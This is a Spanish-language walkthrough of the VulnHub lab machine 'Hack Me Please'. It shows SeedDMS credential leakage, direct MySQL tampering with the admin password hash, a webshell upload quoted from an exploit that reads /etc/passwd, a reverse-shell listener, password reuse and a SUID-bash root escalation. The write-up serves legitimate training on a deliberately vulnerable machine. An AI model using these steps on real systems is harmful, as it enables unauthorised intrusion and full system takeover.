---
title: VH - Hack Me Please
published: true
categories: [Linux]
tags: [eJPT, eWPT, Fácil]
---

<img src="/assets/VH/vulnhub.png">

¡Hola!
Vamos a resolver de la máquina `Hack Me Please` de dificultad "Fácil" de la plataforma [VulnHub](https://www.vulnhub.com/entry/hack-me-please-1,731/).

Técnicas Vistas: 

- **Web Enumeration**
- **SeedDMS Enumeration**
- **Information Leakage**
- **Database Enumeration - MYSQL**
- **Manipulating values stored in the database**
- **SeedDMS Remote Command Execution**
- **Password reuse - User Migration**
- **Abusing Sudoers Privilege [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `HackMePlease`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Primero de todo necesitamos saber la IP de la máquina víctima que se encuentra funcionando dentro de nuestra red local. Procedemos a escanear todos los equipos de nuestra red local

```bash
❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:8d:05:79, IPv4: 192.168.1.148
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	e4:ca:12:8c:78:a5	zte corporation
192.168.1.134	9c:20:7b:b1:3e:47	Apple, Inc.
192.168.1.137	f4:34:f0:50:7e:76	(Unknown)
192.168.1.141	2c:f0:5d:0a:0a:f1	(Unknown)
192.168.1.139	d8:a3:5c:73:eb:02	(Unknown)
192.168.1.144	00:0c:29:4a:6f:fc	VMware, Inc.
192.168.1.131	ac:67:84:98:f6:07	(Unknown)
192.168.1.135	06:02:44:3c:f1:88	(Unknown: locally administered)
```
Tras analizar la respuesta del escaneo observamos por el **OUI (Organizationally unique identifier)** 00:0c:29 que corresponde a VMWare Inc ya que la máquina víctima funciona bajo un entorno de virtualización VMWare por lo que su IP es `192.168.1.144`

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 192.168.1.144
PING 192.168.1.144 (192.168.1.144) 56(84) bytes of data.
64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=42.3 ms

--- 192.168.1.144 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 64.

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.1.144 -oG allPorts

PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
3306/tcp  open  mysql   syn-ack ttl 64
33060/tcp open  mysqlx  syn-ack ttl 64
MAC Address: 00:0C:29:4A:6F:FC (VMware)
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p80,3306,33060 192.168.1.144 -oN targeted

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to the land of pwnland
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.25-0ubuntu0.20.04.1
|   Thread ID: 40
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, SupportsCompression, ODBCClient, ConnectWithDatabase, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsLoadDataLocal, SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake, LongPassword, InteractiveClient, Support41Auth, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x08+\x1Ddp|\x08&OjesT~Sl\x15\x06NN
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
| Not valid before: 2021-07-03T00:33:15
|_Not valid after:  2031-07-01T00:33:15
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```
### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://192.168.1.144
http://192.168.1.144 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.1.144], JQuery[1.11.2], Modernizr[2.8.3-respond-1.4.2.min], Script[text/javascript], Title[Welcome to the land of pwnland], X-UA-Compatible[IE=edge]
```

Accedemos al servicio HTTP por el puerto 80. Inspeccionamos la web sin encontrar funcionalidad

<img src="/assets/VH/HackMePlease/web.png">

Examinando el código fuente localizamos un script `main.js`. Al revisar el código vemos una filtración de una posible ruta

<img src="/assets/VH/HackMePlease/mainjs.png">

Accedemos a la ruta y nos encontramos ante un panel de login de `SeedDMS`. SeedDMS es un sistema de gestión de documentos basado en PHP con un interfaz de usuario fácil de usar para pequeñas y medianas empresas

<img src="/assets/VH/HackMePlease/seedlogin.png">

Buscando en Google localizamos el GitHub de [SeedDMS](https://github.com/JustLikeIcarus/SeedDMS/). Examinando la estructura de carpetas encontramos dentro de `/conf/.htaccess` un comentario en el cñodigo interesante, nos avisa que el archivo `/conf/settings.xml` tiene que tener un redirect por motivos de seguridad

<img src="/assets/VH/HackMePlease/httaccess.png">

Accedemos a la ruta encontrada y nos permite el acceso, examinamos el archivo y encontramos unas credenciales

<img src="/assets/VH/HackMePlease/credentials.png">

Nos conectamos por `MySQL` a la máquina víctima con las credenciales obtenidas

```bash
❯ mysql -useeddms -h 192.168.1.144 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 52
Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Enumerando bases de datos localizamos `seeddms`. Dentro de esta base de datos encontramos la tabla `users`. Listando el contenido obtenemos unas credenciales en texto claro

```bash
MySQL [seeddms]> select * from users;
+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
1 row in set (0,002 sec)
```

Tratamos de loguearnos en el panel de login de `SeedDMS` pero no tenemos éxito. Seguimos enumerando tablas y localizamos otra interesante `tblUsers`. Listamos su contenido y conseguimos más credenciales en `md5`

```bash
MySQL [seeddms]> select id,login,pwd from tblUsers;
+----+-------+----------------------------------+
| id | login | pwd                              |
+----+-------+----------------------------------+
|  1 | admin | f9ef2c539bad8a6d2f3432b6d49ab51a |
|  2 | guest | NULL                             |
+----+-------+----------------------------------+
2 rows in set (0,001 sec)
```

Si tratamos de loguearnos con las nuevas credenciales seguimos sin tener éxito. Generamos nuestra propia password en md5 y actualizamos la password de admin en la base de datos

```bash
❯ echo -n "pass123" | md5sum
32250170a0dca92d53ec9624f336ca24
```

```bash
MySQL [seeddms]> select id,login,pwd from tblUsers;
+----+-------+----------------------------------+
| id | login | pwd                              |
+----+-------+----------------------------------+
|  1 | admin | f9ef2c539bad8a6d2f3432b6d49ab51a |
|  2 | guest | NULL                             |
+----+-------+----------------------------------+
2 rows in set (0,001 sec)

MySQL [seeddms]> update tblUsers set pwd='32250170a0dca92d53ec9624f336ca24' where login='admin';
Query OK, 1 row affected (0,003 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

<img src="/assets/VH/HackMePlease/adminpanel.png">

Buscamos vulnerabilidades asociadas a `SeedDMS` con la herramienta `searchsploit`

```bash
❯ searchsploit seeddms
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                                                                                            | php/webapps/50062.py
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                                                                           | php/webapps/48324.txt
SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting                                                                                                 | php/webapps/47024.txt
SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting                                                                                                   | php/webapps/47023.txt
SeedDMS versions < 5.1.11 - Remote Command Execution                                                                                                       | php/webapps/47022.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Examinamos el contenido de `47022.txt`. Según instrucciones debemos loguearnos, crear un archivo php, subirlo a través de `Add document`, verificar la id asignada y visitamos la ruta en el paso 4 para poder ejecutar de forma remota comandos

```bash
Exploit Steps:

Step 1: Login to the application and under any folder add a document.
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.

PHP Backdoor Code:

Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.
```

Tenemos RCE

<img src="/assets/VH/HackMePlease/rce.png">

Introducimos oneliner para entablar reverse shell y nos ponemos en escucha en el puerto 443

<img src="/assets/VH/HackMePlease/revshell.png">

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.144] 36300
bash: cannot set terminal process group (944): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/4$ whoami
whoami
www-data
```

### Movimiento Lateral

* * *

Enumerando directorios localizamos el directorio del usuario `saket`. Recordemos que encontramos unas credenciales en texto claro de este usuario. Comprobamos si hay reutilización de contraseñas

```bash
www-data@ubuntu:/home$ ls
saket
www-data@ubuntu:/home$ su saket
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

saket@ubuntu:/home$ whoami
saket
```

### Escalada de Privilegios

* * *

Enumerando privilegios de sudo del usuario `saket` vemos que tiene capacidad de ejecutar todo como root

```bash
saket@ubuntu:~$ sudo -l
[sudo] password for saket: 
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

Asignamos privilegio SUID a la bash y nos spawneamos una bash con privilegios de root

```bash
saket@ubuntu:~$ sudo chmod u+s /bin/bash
saket@ubuntu:~$ bash -p
bash-5.0# whoami
root
```



Hemos completado la máquina **Hack Me Please** de VulnHub!! Happy Hacking!!
